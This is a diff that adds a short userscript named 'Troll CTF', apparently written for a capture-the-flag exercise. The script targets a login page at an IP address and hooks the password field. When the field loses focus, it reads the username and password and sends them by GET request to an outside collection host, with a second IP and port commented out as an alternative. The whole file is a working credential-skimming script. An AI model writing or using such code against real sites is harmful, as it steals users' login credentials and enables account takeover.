@@ -1,0 +1,30 @@
+// ==UserScript==
+// @name         Troll CTF
+// @namespace    XZNAAHS
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        https://52.221.141.168/login
+// @grant        none
+// ==/UserScript==
+
+function tamper(){
+  //alert("Hello World");
+  document.getElementsByName("password")[0].addEventListener("blur",message,false);
+}
+
+function message(){
+    //alert("Time To Steal");
+    var usr =  document.getElementsByName("account")[0].value;
+    var pass =  document.getElementsByName("password")[0].value;
+   // alert(usr + pass);
+    var xmlHttp = new XMLHttpRequest();
+    var url="https://dropzone.test.com/data?uname="+usr+"&pass="+pass;
+    //var url="http://3.1.137.176:9999/data?uname="+usr+"&pass="+pass;
+
+    xmlHttp.open("GET",url,false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+    //alert ("JOB Done");
+}
+tamper()
